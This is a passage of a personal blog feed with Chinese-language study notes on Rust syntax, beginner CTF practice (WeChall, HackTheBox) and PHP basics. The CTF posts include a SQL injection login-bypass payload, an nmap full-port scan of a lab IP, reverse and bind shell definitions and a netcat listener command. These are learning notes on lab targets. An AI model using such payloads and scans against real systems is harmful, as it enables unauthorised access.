class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 4"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 3"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 2"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is not divisible by 4, 3, or 2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> condition = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="keyword">if</span> condition &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of number is: &#123;&#125;"</span>, number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h5><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    loop &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"again!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> result = loop &#123;</span><br><span class="line">        counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The result is &#123;&#125;"</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="while"><a href="#while" class="headerlink" title="while"></a>while</h6><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> number != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"&#123;&#125;!"</span>, number);</span><br><span class="line"></span><br><span class="line">        number -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"LIFTOFF!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="for"><a href="#for" class="headerlink" title="for"></a>for</h6><p> use a for loop and execute some code for each item in a collection<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> a.iter() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"the value is: &#123;&#125;"</span>, element);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">4</span>).rev() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"&#123;&#125;!"</span>, number);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"LIFTOFF!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rev, to reverse the range</code></p><h3 id="guess-game-example"><a href="#guess-game-example" class="headerlink" title="guess game . example"></a>guess game . example</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println</span>!(<span class="string">"x = &#123;&#125; and y = &#123;&#125;"</span>, x, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cargo doc --open</code></p><p>The<strong> trim </strong>method on a String instance will eliminate any whitespace at the beginning and end<br>5\n 变成 5<br>The <strong>parse </strong>method on strings parses a string into some kind of number. </p><p>cargo fmt 自动调整格式<br><a href="https://github.com/rust-lang/rustfmt" target="_blank" rel="noopener">https://github.com/rust-lang/rustfmt</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;运行命令&quot;&gt;&lt;a href=&quot;#运行命令&quot; class=&quot;headerlink&quot; title=&quot;运行命令&quot;&gt;&lt;/a&gt;运行命令&lt;/h3&gt;&lt;p&gt;&lt;code&gt;cargo doc --open&lt;/code&gt;&lt;br&gt;&lt;code&gt;rustup doc&lt;/code&gt;&lt;br&gt;&lt;code&gt;cargo new --vcs=git&lt;/code&gt;&lt;br&gt;&lt;code&gt;cargo build&lt;/code&gt;&lt;br&gt;&lt;code&gt;cargo run&lt;/code&gt;&lt;br&gt;&lt;code&gt;cargo check&lt;/code&gt;更快编译，但不生成可执行文件&lt;br&gt;&lt;code&gt;cargo build --release&lt;/code&gt; 生成的执行文件运行更快&lt;br&gt;benchmark基准测试&lt;br&gt;
    
    </summary>
    
    
      <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>CTF入门 WECALL4+hackthebox-REVERSE</title>
    <link href="http://finsenty54.github.io/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/"/>
    <id>http://finsenty54.github.io/2020/07/11/CTF入门 WECALL4+hackthebox-REVERSE/</id>
    <published>2020-07-11T02:37:31.000Z</published>
    <updated>2020-07-11T02:40:05.281Z</updated>
    
    <content type="html"><![CDATA[<h4 id="wechall-register-globals"><a href="#wechall-register-globals" class="headerlink" title="wechall register_globals"></a>wechall register_globals</h4><p>register_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量<br><a href="http://1.1.1.1/report.asp?id=123&amp;kehu=222" target="_blank" rel="noopener">http://1.1.1.1/report.asp?id=123&amp;kehu=222</a><br>login[0]=admin 直接login=admin 只取第一第二个字符</p><hr><h4 id="hackthebox"><a href="#hackthebox" class="headerlink" title="hackthebox"></a>hackthebox</h4><p>invite challenge 浏览器console 下运行函数 加（）<br>curl -X POST https://…</p><a id="more"></a><hr><h4 id="hackthebox-–-Enumeration"><a href="#hackthebox-–-Enumeration" class="headerlink" title="hackthebox – Enumeration"></a>hackthebox – Enumeration</h4><p>ports=$(nmap -p- –min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d ‘/‘ -f 1 | tr ‘\n’ ‘,’ | sed s/,$//)<br>nmap -sC -sV -p$ports 10.10.10.27</p><p>command 1 | command 2 把第一个命令command 1执行的结果作为command 2的输入传给command 2<br>-T4 可以加快执行速度<br>-p- 扫描所有端口<br>-min-rate 1000 to request that Nmap send at least 1,000 packets per secondcut<br>cut Print selected parts of lines from each FILE to standard output.<br>-f 指定第一列 -d 指定列分隔符<br> tr 命令用于转换或删除文件中的字符 ‘\n’ 转换为‘，’<br>sed ‘s/regexp/replacement/flags’.<br>Its basic concept is simple: the s command attempts to match the pattern space against the supplied regular expression regexp; if the match is successful, then that portion of the pattern space which was matched is replaced with replacement.<br>regexp匹配成功后用replace替代</p><p>select IS_SRVROLEMEMBER (‘sysadmin’)</p><hr><p>remote code execution (RCE)</p><h4 id="A-reverse-shell"><a href="#A-reverse-shell" class="headerlink" title="A reverse shell"></a>A reverse shell</h4><p>is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.</p><h4 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h4><p>Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server.</p><hr><p>netcat<br>nc -lvnp 443 监听模式 443 外来请求</p><hr><h4 id="ollydbg"><a href="#ollydbg" class="headerlink" title="ollydbg"></a>ollydbg</h4><p>显示当前EIP *<br>执行到光标位置 F4<br>F2 断点<br>CALL 把接下来的地址先压入栈<br>win 压入参数逆序 f(a,b) 先压b 后 a<br>test = and 不改变操作数值</p><h4 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h4><p>file test.py</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;wechall-register-globals&quot;&gt;&lt;a href=&quot;#wechall-register-globals&quot; class=&quot;headerlink&quot; title=&quot;wechall register_globals&quot;&gt;&lt;/a&gt;wechall register_globals&lt;/h4&gt;&lt;p&gt;register_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量&lt;br&gt;&lt;a href=&quot;http://1.1.1.1/report.asp?id=123&amp;amp;kehu=222&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://1.1.1.1/report.asp?id=123&amp;amp;kehu=222&lt;/a&gt;&lt;br&gt;login[0]=admin 直接login=admin 只取第一第二个字符&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;hackthebox&quot;&gt;&lt;a href=&quot;#hackthebox&quot; class=&quot;headerlink&quot; title=&quot;hackthebox&quot;&gt;&lt;/a&gt;hackthebox&lt;/h4&gt;&lt;p&gt;invite challenge 浏览器console 下运行函数 加（）&lt;br&gt;curl -X POST https://…&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://finsenty54.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF入门 WECALL2-正则</title>
    <link href="http://finsenty54.github.io/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/"/>
    <id>http://finsenty54.github.io/2020/07/06/CTF入门 WECALL2/</id>
    <published>2020-07-06T05:54:43.000Z</published>
    <updated>2020-07-06T06:01:18.207Z</updated>
    
    <content type="html"><![CDATA[<p>python3<br>list()   一个字符字符分</p><hr><p>child[a],child[b] = child[b],child[a]</p><h5 id="交换位置"><a href="#交换位置" class="headerlink" title="交换位置"></a>交换位置</h5><a id="more"></a><hr><p>spilt() 按空格分<br>int()</p><hr><h3 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h3><p><a href="http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/" target="_blank" rel="noopener">http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/</a></p><h3 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h3><p>import sys<br>sys.stdout = open(‘/root/Documents/CTF_WECALL/results.py’, mode = ‘w’,encoding=’utf-8’)</p><p>打印到文件中</p><p>line breaks. 换行符</p><p>vscode python 整段右移 选中tab</p><hr><h3 id="python-2-转到-3"><a href="#python-2-转到-3" class="headerlink" title="python 2 转到 3"></a>python 2 转到 3</h3><p>2to3.py</p><hr><h3 id="正则30分钟学习"><a href="#正则30分钟学习" class="headerlink" title="正则30分钟学习"></a>正则30分钟学习</h3><p><a href="https://deerchao.cn/tutorials/regex/regex.htm" target="_blank" rel="noopener">https://deerchao.cn/tutorials/regex/regex.htm</a></p><h3 id="wechall-mysql-2"><a href="#wechall-mysql-2" class="headerlink" title="wechall mysql 2"></a>wechall mysql 2</h3><p>‘ union select 1,’admin’ ,md5(‘1’)  from users where username =’admin’#</p><p><code>？？可以随便选择</code></p><h3 id="wechall-WWW-Basics"><a href="#wechall-WWW-Basics" class="headerlink" title="wechall WWW-Basics"></a>wechall WWW-Basics</h3><p>lsof -i:端口号 用于查看某一端口的占用情况，比如查看8000端口使用情况，lsof -i:8000</p><p>nginx -s quit<br>ps -ax | grep nginx<br>lsof -i:80<br>ip add</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python3&lt;br&gt;list()   一个字符字符分&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;child[a],child[b] = child[b],child[a]&lt;/p&gt;
&lt;h5 id=&quot;交换位置&quot;&gt;&lt;a href=&quot;#交换位置&quot; class=&quot;headerlink&quot; title=&quot;交换位置&quot;&gt;&lt;/a&gt;交换位置&lt;/h5&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://finsenty54.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF入门 WECALL 2</title>
    <link href="http://finsenty54.github.io/2020/05/19/CTF%E5%85%A5%E9%97%A8%20WECALL1/"/>
    <id>http://finsenty54.github.io/2020/05/19/CTF入门 WECALL1/</id>
    <published>2020-05-19T12:03:39.000Z</published>
    <updated>2020-05-19T12:07:49.772Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是PHP文件？"><a href="#什么是PHP文件？" class="headerlink" title="什么是PHP文件？"></a>什么是PHP文件？</h3><p>PHP文件可以包含文本，HTML，CSS，JavaScript和PHP代码<br>PHP代码在服务器上执行，结果以纯HTML格式返回到浏览器<br>PHP文件的扩展名为“ .php”</p><a id="more"></a><h3 id="PHP可以做什么？"><a href="#PHP可以做什么？" class="headerlink" title="PHP可以做什么？"></a>PHP可以做什么？</h3><p>PHP可以生成动态页面内容<br>PHP可以在服务器上创建，打开，读取，写入，删除和关闭文件<br>PHP可以收集表单数据<br>PHP可以发送和接收Cookie<br>PHP可以添加，删除，修改数据库中的数据<br>PHP可用于控制用户访问<br>PHP可以加密数据<br>使用PHP，您不仅可以输出HTML。您可以输出图像，PDF文件甚至Flash电影。您还可以输出任何文本，例如XHTML和XML。</p><p>PHP脚本可以放在文档中的任何位置。<br>PHP脚本的开头<code>&lt;?php</code>和结尾是<code>?&gt;</code>：<br>&lt;?php<br>// PHP code goes here<br>?&gt;<br>PHP文件的默认文件扩展名是“ .php”。<br>一个PHP文件通常包含HTML标记和一些PHP脚本代码。</p><p> PHP语句以分号（<code>;</code>）结尾。</p><p>在PHP中，关键字（例如if， else，while， echo等），类，函数，和用户定义的函数<code>是不区分大小写。</code></p><p>所有<code>变量名称均区分大小写</code>！</p><p>comment<br>//<br>#<br>/<em>        </em>/</p><p>在PHP中，变量以$符号开头，后跟变量名称</p><p>与其他编程语言不同，PHP没有用于声明变量的命令。它是在您首次为其分配值时创建的。</p><p>&lt;?php<br>$txt = “W3Schools.com”;<br>echo “I love $txt!”;<br>?&gt;</p><p>&lt;?php<br>$txt = “W3Schools.com”;<br>echo “I love “ . $txt . “!”;<br>?&gt;</p><p>&lt;?php<br>$x = 5;<br>$y = 4;<br>echo $x + $y;<br>?&gt;</p><h5 id="在函数外部声明的变量具有全局范围，并且只能在函数外部访问"><a href="#在函数外部声明的变量具有全局范围，并且只能在函数外部访问" class="headerlink" title="在函数外部声明的变量具有全局范围，并且只能在函数外部访问"></a>在函数外部声明的变量具有全局范围，并且只能在函数外部访问</h5><h5 id="在函数内声明的变量具有局部范围，只能在该函数内访问"><a href="#在函数内声明的变量具有局部范围，只能在该函数内访问" class="headerlink" title="在函数内声明的变量具有局部范围，只能在该函数内访问"></a>在函数内声明的变量具有局部范围，只能在该函数内访问</h5><h5 id="global关键字用于在函数内部访问一个全局变量。"><a href="#global关键字用于在函数内部访问一个全局变量。" class="headerlink" title="global关键字用于在函数内部访问一个全局变量。"></a>global关键字用于在函数内部访问一个全局变量。</h5><p>为此，请global在变量之前（在函数内部）使用关键字<br>&lt;?php<br>$x = 5;<br>$y = 10;<br>function myTest() {<br>  global $x, $y;<br>  $y = $x + $y;<br>}<br>myTest();<br>echo $y; // outputs 15<br>?&gt;</p><p>PHP also stores all global variables in an array called $GLOBALS[index]. The index holds the name of the variable. This array is also accessible from within functions and can be used to update global variables directly.</p><p>&lt;?php<br>$x = 5;<br>$y = 10;<br>function myTest() {<br>  $GLOBALS[‘y’] = $GLOBALS[‘x’] + $GLOBALS[‘y’];<br>}<br>myTest();<br>echo $y; // outputs 15<br>?&gt;</p><p>通常，当一个函数完成/执行时，它的所有变量都会被删除。但是，有时我们希望不删除局部变量。我们需要它来做进一步的工作。<br>为此，请static在首次声明变量时使用关键字<br>然后，每次调用该函数时，该变量仍将具有自上次调用该函数以来所包含的信息。<br>注意：该变量仍然是函数的局部变量。</p><p>差异很小：echo没有返回值，而print返回值为1，因此可以在表达式中使用。echo可以采用多个参数（尽管这种用法很少见），而print可以采用一个参数。echo比快一点print。</p><p>&lt;?php<br>echo “</p><h2>PHP is Fun!</h2>“;<br>echo “Hello world!<br>“;<br>echo “I’m about to learn PHP!<br>“;<br>echo “This “, “string “, “was “, “made “, “with multiple parameters.”;<br>?&gt;<p></p><h5 id="字符串可以是引号内的任何文本。可以使用单引号或双引号"><a href="#字符串可以是引号内的任何文本。可以使用单引号或双引号" class="headerlink" title="字符串可以是引号内的任何文本。可以使用单引号或双引号"></a>字符串可以是引号内的任何文本。可以使用单引号或双引号</h5><p>整数数据类型是-2,147,483,648和2,147,483,647之间的非十进制数。<br>PHP var_dump（）函数返回数据类型和值</p><p>&lt;?php<br>$cars = array(“Volvo”,”BMW”,”Toyota”);<br>var_dump($cars);<br>?&gt;</p><p>首先，我们必须声明一个对象类。为此，我们使用class关键字。类是可以包含属性和方法的结构：<br>&lt;?php<br>class Car {<br>  function Car() {<br>    $this-&gt;model = “VW”;<br>  }<br>}<br>// create an object<br>$herbie = new Car();<br>// show object properties<br>echo $herbie-&gt;model;<br>?&gt;</p><p>如果创建的变量没有值，则会自动为其分配值NULL。<br>也可以通过将值设置为NULL来清空变量：</p><p>关于PHP的注意事项之一是它提供了自动数据类型转换。<br>因此，如果将整数值分配给变量，则该变量的类型将自动为整数。然后，如果将字符串分配给相同的变量，则类型将更改为字符串。</p><p>整数可以以三种格式指定：十进制（基于10的），十六进制（基于16的-带有0x前缀）或八进制（基于8的-带有0前缀）</p><p>（int），（integer）或intval（）函数通常用于将值转换为整数。</p><p>有效的常量名称以字母或下划线开头（常量名称前没有$符号）。</p><p>注意：与变量不同，常量在整个脚本中自动为全局变量。<br>define(name, value, case-insensitive)<br>在PHP7中，您可以使用define()函数创建一个Array常量。</p><p>.    Concatenation    $txt1 . $txt2    Concatenation of $txt1 and $txt2<br>.=    Concatenation assignment    $txt1 .= $txt2    Appends $txt2 to $txt1</p><p>&lt;?php<br>$t = date(“H”);</p><p>if ($t &lt; “20”) {<br>  echo “Have a good day!”;<br>}<br>?&gt;</p><h4 id="该foreach循环仅适用于数组，用于循环遍历数组中的每个键-值对。"><a href="#该foreach循环仅适用于数组，用于循环遍历数组中的每个键-值对。" class="headerlink" title="该foreach循环仅适用于数组，用于循环遍历数组中的每个键/值对。"></a>该foreach循环仅适用于数组，用于循环遍历数组中的每个键/值对。</h4><p>句法<br>foreach ($array as $value) {<br>  code to be executed;<br>}<br>对于每次循环迭代，当前数组元素的值都分配给$ value，并且数组指针移动一个，直到到达最后一个数组元素。</p><p>要指定，strict我们需要设置declare(strict_types=1);。这必须在PHP文件的第一行。<br>这为我们提供了一个在声明函数时指定所需数据类型的选项，并且通过添加strict 声明，如果数据类型不匹配，它将抛出“致命错误”。</p><p>&lt;?php declare(strict_types=1); // strict requirement<br>function addNumbers(float $a, float $b) : float {<br>  return $a + $b;<br>}<br>echo addNumbers(1.2, 5.2);<br>?&gt;</p><p>&lt;?php declare(strict_types=1); // strict requirement<br>function addNumbers(float $a, float $b) : int {<br>  return (int)($a + $b);<br>}<br>echo addNumbers(1.2, 5.2);<br>?&gt;</p><p>&lt;?php<br>$cars = array(“Volvo”, “BMW”, “Toyota”);<br>echo “I like “ . $cars[0] . “, “ . $cars[1] . “ and “ . $cars[2] . “.”;<br>?&gt;</p><p>关联数组是使用分配给它们的命名键的数组。<br>有两种创建关联数组的方法：<br>$age = array(“Peter”=&gt;”35”, “Ben”=&gt;”37”, “Joe”=&gt;”43”);<br>要么：<br>$age[‘Peter’] = “35”;<br>$age[‘Ben’] = “37”;<br>$age[‘Joe’] = “43”;<br>然后可以在脚本中使用命名的键：</p><p>$cars = array (<br>  array(“Volvo”,22,18),<br>  array(“BMW”,15,13),<br>  array(“Saab”,5,2),<br>  array(“Land Rover”,17,15)<br>);<br>&lt;?php<br>echo $cars[0][0].”: In stock: “.$cars[0][1].”, sold: “.$cars[0][2].”.<br>“;<br>echo $cars[1][0].”: In stock: “.$cars[1][1].”, sold: “.$cars[1][2].”.<br>“;<br>echo $cars[2][0].”: In stock: “.$cars[2][1].”, sold: “.$cars[2][2].”.<br>“;<br>echo $cars[3][0].”: In stock: “.$cars[3][1].”, sold: “.$cars[3][2].”.<br>“;<br>?&gt;</p><p>sort() -以升序排列数组<br>rsort() -以降序排列数组<br>asort() -根据值以升序对关联数组进行排序<br>ksort() -根据键以升序对关联数组进行排序<br>arsort() -根据值以降序对关联数组进行排序<br>krsort() -根据键以降序对关联数组进行排序</p><h4 id="用于在使用method-“-post”提交HTML表单后收集表单数据。-POST也广泛用于传递变量。"><a href="#用于在使用method-“-post”提交HTML表单后收集表单数据。-POST也广泛用于传递变量。" class="headerlink" title="用于在使用method =“ post”提交HTML表单后收集表单数据。$ _POST也广泛用于传递变量。"></a>用于在使用method =“ post”提交HTML表单后收集表单数据。$ _POST也广泛用于传递变量。</h4><h5 id="SERVER-‘PHP-SELF’-Returns-the-filename-of-the-currently-executing-script"><a href="#SERVER-‘PHP-SELF’-Returns-the-filename-of-the-currently-executing-script" class="headerlink" title="$_SERVER[‘PHP_SELF’]    Returns the filename of the currently executing script"></a>$_SERVER[‘PHP_SELF’]    Returns the filename of the currently executing script</h5><h5 id="SERVER-‘REQUEST-METHOD’-Returns-the-request-method-used-to-access-the-page-such-as-POST"><a href="#SERVER-‘REQUEST-METHOD’-Returns-the-request-method-used-to-access-the-page-such-as-POST" class="headerlink" title="$_SERVER[‘REQUEST_METHOD’]    Returns the request method used to access the page (such as POST)"></a>$_SERVER[‘REQUEST_METHOD’]    Returns the request method used to access the page (such as POST)</h5><h4 id="PHP-GET是一个PHP超级全局变量，用于在使用method-“-get”提交HTML表单后收集表单数据。"><a href="#PHP-GET是一个PHP超级全局变量，用于在使用method-“-get”提交HTML表单后收集表单数据。" class="headerlink" title="PHP $ _GET是一个PHP超级全局变量，用于在使用method =“ get”提交HTML表单后收集表单数据。"></a>PHP $ _GET是一个PHP超级全局变量，用于在使用method =“ get”提交HTML表单后收集表单数据。</h4><h5 id="GET还可以收集在URL中发送的数据。"><a href="#GET还可以收集在URL中发送的数据。" class="headerlink" title="$ _GET还可以收集在URL中发送的数据。"></a>$ _GET还可以收集在URL中发送的数据。</h5><h4 id="使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。"><a href="#使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。" class="headerlink" title="使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。"></a>使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。</h4><p>GET可以用于发送非敏感数据。<br>注意：绝对不要将GET用于发送密码或其他敏感信息！</p><h5 id="使用POST方法从表单发送的信息对于其他人是不可见的-（所有名称-值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。"><a href="#使用POST方法从表单发送的信息对于其他人是不可见的-（所有名称-值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。" class="headerlink" title="使用POST方法从表单发送的信息对于其他人是不可见的 （所有名称/值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。"></a>使用POST方法从表单发送的信息对于其他人是不可见的 （所有名称/值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。</h5><p>此外，POST支持高级功能，例如在将文件上传到服务器时支持多部分二进制输入。<br>但是，由于变量未显示在URL中，因此无法为页面添加书签。</p><h5 id="SERVER-“-PHP-SELF”-将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。"><a href="#SERVER-“-PHP-SELF”-将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。" class="headerlink" title="$ _ SERVER [“ PHP_SELF”]将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。"></a>$ _ SERVER [“ PHP_SELF”]将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。</h5><p>htmlspecialchars（）函数将特殊字符转换为HTML实体。这意味着它将用＆lt;替换&lt;和&gt;之类的HTML字符。和＆gt;。这样可以防止攻击者通过以表格形式注入HTML或Javascript代码（跨站点脚本攻击）来利用代码。</p><h5 id="从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP-trim（）函数）"><a href="#从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP-trim（）函数）" class="headerlink" title="从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP trim（）函数）"></a>从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP trim（）函数）</h5><h5 id="从用户输入数据中删除反斜杠（-）（使用PHP-stripslashes（）函数）"><a href="#从用户输入数据中删除反斜杠（-）（使用PHP-stripslashes（）函数）" class="headerlink" title="从用户输入数据中删除反斜杠（\）（使用PHP stripslashes（）函数）"></a>从用户输入数据中删除反斜杠（\）（使用PHP stripslashes（）函数）</h5><p>使用PHP empty() 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span>PHP_SELF<span class="string">"]);?&gt;"</span>&gt;</span><br><span class="line">Name: &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">E-mail:</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;* &lt;?php echo $emailErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Website:</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"website"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;&lt;?php echo $websiteErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Comment: &lt;textarea name=<span class="string">"comment"</span> rows=<span 